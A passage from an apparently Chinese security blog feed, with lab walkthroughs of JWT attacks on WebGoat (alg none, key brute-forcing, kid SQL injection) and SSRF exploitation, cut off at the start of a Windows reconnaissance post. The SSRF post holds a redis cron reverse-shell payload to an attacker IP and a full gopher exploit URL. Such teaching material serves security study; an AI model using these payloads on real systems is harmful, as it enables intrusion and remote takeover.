class="punctuation">:</span> <span class="string">&quot;jerry@webgoat.com&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jerry&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;Email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jerry@webgoat.com&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;Role&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>   </span><br><span class="line">        <span class="string">&quot;Cat&quot;</span>  </span><br><span class="line">    <span class="punctuation">]</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>一些固定参数：</p><ul><li>iss：发行人</li><li>iat：发布时间</li><li>exp：到期时间</li><li>aud：用户</li><li>sub：主题</li><li>nbf：生效时间</li><li>jti：JWT编号</li></ul><p><strong>signature</strong></p><p>采用header中指定的算法以及自定义密钥对header和claims签名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">    base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +  </span><br><span class="line">    base64UrlEncode(payload),  </span><br><span class="line">    your-<span class="number">256</span>-bit-secret </span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="JWT会话流程"><a href="#JWT会话流程" class="headerlink" title="JWT会话流程"></a><strong>JWT会话流程</strong></h1><ol><li>客户端将用户名和密码发给服务端。</li><li>验证成功后生成JWT返回给客户端，包括有效时间较短的access token和有效时间较长的refresh token。</li><li>客户端在下次会话时将access token写在请求头的Authorization字段中发给服务端。</li><li>若access token未过期，服务端验证JWT，成功后返回响应，确认用户登录。</li><li>若access token过期，客户端访问刷新接口，携带access token和refresh token。</li><li>若refresh token没有过期，服务端验证通过后生成新的access token返回给客户端，若过期则生成新的refresh token保存并下发。</li></ol><h1 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a><strong>攻击方法</strong></h1><ol><li>alg设置none绕过签名。</li><li>暴破密钥重建token。</li><li>利用refresh token刷新他人access token。</li><li>头字段注入。</li></ol><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h1><p>搭建环境。</p><p><a href="https://github.com/WebGoat/WebGoat/">https://github.com/WebGoat/WebGoat/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8080:8080 -p 9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf</span><br></pre></td></tr></table></figure><p><a href="http://172.16.1.5:8080/WebGoat/login">http://172.16.1.5:8080/WebGoat/login</a></p><h2 id="alg设置none绕过签名"><a href="#alg设置none绕过签名" class="headerlink" title="alg设置none绕过签名"></a><strong>alg设置none绕过签名</strong></h2><p>第四关。</p><p>直接清除权限不够。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224105539.png"></p><p>解码得：</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224105547.png"></p><p>修改后得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;none&quot;&#125;  =&gt;  eyJhbGciOiJub25lIn0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;iat&quot;:1614691419,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;   =&gt;   eyJpYXQiOjE2MTQ2OTE0MTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ</span><br></pre></td></tr></table></figure><p>拼接后得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE2MTQ2OTE0MTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</span><br></pre></td></tr></table></figure><p>注意最后的点。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110421.png"></p><p>用jwt_tool可以扫描。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MTQ2NjkzMDIsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.kuAXUbVdbd13DjJKQ-XtIzXLU22It4sW3Bw8z0yyZgJu_G8y55gK8pkJ0azIHDJtmzSAP5cuO6ghS-jeBimdhw -X a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110518.png"></p><h2 id="暴破密钥重建token"><a href="#暴破密钥重建token" class="headerlink" title="暴破密钥重建token"></a>暴破密钥重建token</h2><p>第五关。  </p><p>根据提示的token解码得到：</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110651.png"></p><p>暴破密钥，字典需自己构建。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py eyJhbGcioiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMzgzMDIyNiwiZXhwIjoxNjEzODMwMjg2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19._c6gzZwVGp6Y1rq5-j6k3FGOdVcXLix7inM1aCc3XwE -C -d pass.txt</span><br></pre></td></tr></table></figure><p>得到：victory。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110715.png"></p><p>修改token到期时间以及username后重新签名提交即可。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110747.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110754.png"></p><h2 id="利用refresh-token刷新他人access-token"><a href="#利用refresh-token刷新他人access-token" class="headerlink" title="利用refresh token刷新他人access token"></a>利用refresh token刷新他人access token</h2><p>第七关。</p><p>根据提示，tom的access token已过期。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111128.png"></p><p>访问登录接口登录jerry，获取token。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111220.png"></p><p>现在有了tom过期的access token，可以拿刚申请的jerry的refresh token刷新。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111300.png"></p><p>得到tom新的access token。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111355.png"></p><p>拿新的token去付款，ok。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111404.png"></p><h2 id="头字段注入"><a href="#头字段注入" class="headerlink" title="头字段注入"></a>头字段注入</h2><p>第八关，kid字段存在注入。</p><p>根据提示获取jerry的access token。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111631.png"></p><p>只会常规方法，菜鸡不知所措。</p><p>参考大佬白盒审计。kid没有任何过滤就带入数据库。此处key就是JWT签名的密钥。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111706.png"></p><p>构造payload，联合查询指定自定义密钥。源码里查询结果会先base64解码，NjY2为666编码后的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT key FROM jwt_keys WHERE id = &#x27;&#x27; union select &#x27;NjY2&#x27; FROM jwt_keys where id=&#x27;webgoat_key</span><br></pre></td></tr></table></figure><p>这种也行，讲道理from后写任意存在表名即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION select &#x27;NjY2&#x27; from INFORMATION_SCHEMA.SCHEMATA--+</span><br></pre></td></tr></table></figure><p>带入kid，把username改成Tom，得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJraWQiOiInIHVuaW9uIHNlbGVjdCAnTmpZMicgRlJPTSBqd3Rfa2V5cyB3aGVyZSBpZD0nd2ViZ29hdF9rZXkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.fODOsXyyKNIjvBiUULq6_QIg-uRGICKgIWNYT3Rbez4</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111737.png"></p><p>ok。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111755.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://zhuanlan.zhihu.com/p/69531279">https://zhuanlan.zhihu.com/p/69531279</a></p><p><a href="https://www.cnblogs.com/Secde0/p/13968608.html">https://www.cnblogs.com/Secde0/p/13968608.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT </tag>
            
            <tag> JSON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2021/02/19/813434ca.html"/>
      <url>/2021/02/19/813434ca.html</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h1><p>服务端的跨站请求伪造，由攻击者构造请求，由服务端发起而造成的安全漏洞。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h1><p>应用在调用其他服务器上的资源时会请求目标地址，假设目标地址被攻击者控制，就可以促使服务器访问内网或外网的其他服务。如从指定url地址获取网页文本内容，加载指定地址的图片等。</p><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a><strong>危害</strong></h1><ol><li><p>端口扫描，获取服务banner信息（本地回显开启）。</p><p> 非http端口会返回banner信息。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218153838.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218153941.png"></p><p>端口关闭会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218154018.png"></p><p>端口关闭会直接刷新，开启的端口会一直显示“正在连接”。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219142736.png"></p></li><li><p>攻击应用程序。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218154810.png"></p><p>识别应用指纹，访问默认文件（facicon.ico、robots等）。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218155157.png"></p></li><li><p>攻击web应用，如sturts2和sqli 等。或者当做跳板隐藏ip。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218155409.png"></p></li><li><p>利用file协议读取本地文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218155539.png"></p></li><li><p>通过响应时间长短判断主机存活。</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218155806.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218155814.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210218155826.png"></p><h1 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a><strong>挖掘</strong></h1><p><strong>web功能</strong></p><ol><li><p>分享功能：分享网页内容、网站采集等。</p><p>web应用在分享功能中，通常会获取目标网页内容中的<tilte>标签或<meta>标签中content的文本内容作为显示。如几年前的人人网分享功能：<a href="http://widget.renren.com/xxxxxx?resourceUrl=https://www.sobug.com">http://widget.renren.com/xxxxxx?resourceUrl=https://www.sobug.com</a></p></li><li><p>转码服务：网页浏览-&gt;手机屏幕浏览。</p></li><li><p>在线翻译：通过url地址翻译对应文本内容。</p></li><li><p>图片加载与下载：通过url地址加载或下载图片。</p></li><li><p>图片、文章收藏功能。</p></li><li><p>厂商自己的api，远程调用。</p></li></ol><p><strong>url关键字</strong></p><p>url、image、domain、link、src、source、target、display、share等。</p><h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a><strong>验证</strong></h1><p>例如：   </p><p><a href="http://xxxxxxxx.com/service?image=http://www.baidu.com/img/bd_logo1.png">http://xxxxxxxx.com/service?image=http://www.baidu.com/img/bd_logo1.png</a></p><p>右键图片在新窗口打开，如果是url地址是<a href="http://www.baidu.com/img/bd_logo1.png%EF%BC%8C%E8%AF%B4%E6%98%8E%E4%B8%8D%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%B0%86%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞，并没有将文件写入到服务器。</a></p><p>如下图就是目标网站已将远程图片写入到本地服务器，可能存在ssrf。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219141610.png"></p><p>或者直接读取。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219141551.png"></p><p>或者使用抓包工具来判断。首先SSRF是由服务端发起的请求，因此在加载图片时，本地浏览器的请求中不应该存在图片的请求。</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a><strong>绕过</strong></h1><p>如果web服务简单的过滤参数中获取的url地址，没有判断真正访问的地址，是有可能被此方法绕过的。</p><ol><li><p>使用@：<a href="http://www.baidu.com@127.0.0.1=127.0.0.1">http://www.baidu.com@127.0.0.1=127.0.0.1</a></p><p>服务端对访问的url解析不当，只对匹配http至com之间的内容进行解析，但实际上访问的是127.0.0.1。      </p></li><li><p>IP地址转换进制：</p><p>十进制：127.0.0.1&#x3D;2130706433  </p><p>八进制：127.0.0.1&#x3D;0177.0.0.1 </p><p>十六进制：127.0.0.1&#x3D;0x7f.0.0.1</p><p>（特殊：10.0.0.1&#x3D;10.1）</p></li><li><p>使用短地址：<a href="http://127.0.0.1=http//1il70.cn/1QFuu">http://127.0.0.1=http://1il70.cn/1QFuu</a></p></li><li><p>xip.io特殊域名（.xip.name也可以）。</p><p>127.0.0.1.xip.io&#x3D;<a href="http://www.127.0.0.1.xip.io=127.0.0.1=foo.bar.127.0.0.1.xip.io=mysite.127.0.0.1.xip.io=127.0.0.1">www.127.0.0.1.xip.io=127.0.0.1=foo.bar.127.0.0.1.xip.io=mysite.127.0.0.1.xip.io=127.0.0.1</a></p></li><li><p>用非http协议：gopher、file、dict……..</p></li><li><p>端口绕过：ip后面加一个端口。</p></li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a><strong>防御</strong></h1><ol><li><p>过滤返回给用户的信息。</p></li><li><p>统一错误信息，防止用户判断端口状态。</p></li><li><p>限制请求端口，如80、443、8080等。</p></li><li><p>内网ip加入黑名单。避免被用来攻击内网。</p></li><li><p>禁用不用的协议。如file、gopher、ftp 等。</p></li></ol><h1 id="利用SSRF进行redis计划任务反弹shell"><a href="#利用SSRF进行redis计划任务反弹shell" class="headerlink" title="利用SSRF进行redis计划任务反弹shell"></a><strong>利用SSRF进行redis计划任务反弹shell</strong></h1><p>老生常谈。</p><p><strong>环境</strong></p><ul><li><p>Win10+php                 172.16.1.1          SSRF漏洞服务器</p></li><li><p>Centos+redis              172.16.1.25        靶机</p></li><li><p>Kali                               172.16.1.23        攻击机</p></li></ul><p>编写漏洞代码：ssrf_url.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># 访问 http://127.0.0.1/practice/ssrf/ssrf_url.php?url=www.baidu.com</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();     <span class="comment">//初始化</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line"><span class="comment"># curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   // 屏蔽回显</span></span><br><span class="line"><span class="comment"># curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);        <span class="comment">//执行并获取内容 </span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);       <span class="comment">//释放curl句柄</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Gopher协议类似http协议，可以进行GET、POST 请求，利用此协议可以攻击内网的FTP、Telnet、redis、Memcache等。</p><p>启动redis服务。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf</span><br><span class="line">redis-cli -h 172.16.1.25 -p 6379</span><br></pre></td></tr></table></figure><p>kali监听本地端口。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><p>随后编写redis反弹shell脚本。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n\n\*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.16.1.23/6666 0&gt;&amp;1\n\n\n&quot;</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br></pre></td></tr></table></figure><p>代码意思为，在redis的第0个数据库中添加key为1，value为\n\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.1.23&#x2F;6666 0&gt;&amp;1\n\n\n\n的字段。最后会多出一个\n是因为echo重定向最后会自带一个换行符。</p><p>接下来就需要将该脚本转换成Gopher协议可使用的格式。</p><p>使用socat进行端口转发，获取redis攻击的TCP数据包，将流向本地8888端口的数据转发到172.16.1.25的6379端口。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:8888,fork tcp-connect:172.16.1.25:6379</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219141808.png"></p><p>执行脚本。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219141820.png"></p><p>捕获到数据，将其保存到socat.log中。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219141833.png"></p><p>手动或者使用脚本转换格式，去除无用字符串。贴上大佬写的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;socat.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> a:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> a.readlines():</span><br><span class="line">        <span class="keyword">if</span> b[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;&gt;&lt;+&#x27;</span>:                 <span class="comment">#去掉含有&gt;&lt;+的行</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> b[-<span class="number">3</span>:-<span class="number">1</span>] == <span class="string">r&#x27;\r&#x27;</span>:            <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(b) == <span class="number">3</span>:                   <span class="comment"># 如果只有\r就替换</span></span><br><span class="line">                exp = exp + <span class="string">&#x27;%0a%0d%0a&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                b = b.replace(<span class="string">r&#x27;\r&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>)  <span class="comment">#将语句末尾\r去掉</span></span><br><span class="line">                b = b.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                exp = exp + b</span><br><span class="line">        <span class="keyword">elif</span> b == <span class="string">&#x27;\x0a&#x27;</span>:      <span class="comment">#将空行替换</span></span><br><span class="line">            exp = exp + <span class="string">&#x27;%0a&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = b.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            exp = exp + b</span><br><span class="line"><span class="built_in">print</span> exp</span><br></pre></td></tr></table></figure><p>转换规则：</p><ul><li><p>丢弃第一字符为&gt;或&lt;的行。丢弃前3个字符是+OK的行。</p></li><li><p>替换\r字符串为%0d%0a。替换空白行为%0a。</p></li></ul><p>得到结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*3%0d%0a$3%0d%0aset%0d%0a1%0d%0a$60%0d%0a%0a%0a%0a*/1 * * * *bash -i&gt;&amp; /dev/tcp/65.49.222.180/6666 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/crontabs/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219141936.png"></p><p>拼凑成适配gopher协议的payload，随后再进行url编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2F%2F172.16.1.16%3A6379%2F_*3%250d%250a%243%250d%250aset%250d%250a1%250d%250a%2460%250d%250a%250a%250a%250a*%2F1%20*%20*%20*%20*bash%20-i%3E%26%20%2Fdev%2Ftcp%2F65.49.222.180%2F6666%200%3E%261%250a%250a%250a%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2Fcrontabs%2F%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a</span><br></pre></td></tr></table></figure><p>随后在浏览器直接访问完整的url即可。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219142136.png"></p><p>或者执行curl命令。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219142100.png"></p><p>部分返回信息如下。出现ok说明成功。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219142033.png"></p><p>centos的&#x2F;var&#x2F;spool&#x2F;cron目录下会生成root用户的计划任务。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219142843.png"></p><p>等待一会儿监听端口就会出现反弹出的shell。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210219142255.png"></p><p><strong>tips：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -l           查看计划任务</span><br><span class="line">crontab -r           删除计划任务</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.91ri.org/17111.htm">http://www.91ri.org/17111.htm</a></p><p><a href="https://www.freebuf.com/articles/web/135342.html">https://www.freebuf.com/articles/web/135342.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> 反弹Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows本地信息收集</title>
      <link href="/2021/02/15/ef92bfc1.html"/>
      <url>/2021/02/15/ef92bfc1.html</url>
      
        <content type="html"><![CDATA[<h1 id="查询网络配置"><a href="#查询网络配置" class="headerlink" title="查询网络配置"></a><strong>查询网络配置</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><h1 id="操作系统、补丁及软件信息"><a href="#操作系统、补丁及软件信息" class="headerlink" title="操作系统、补丁及软件信息"></a><strong>操作系统、补丁及软件信息</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systeminfo     查看一堆信息</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn    查看补丁详细信息</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%     查看系统体系架构 </span><br><span class="line">wmic product get name,version     查看安装的软件及版本</span><br><span class="line">powershell 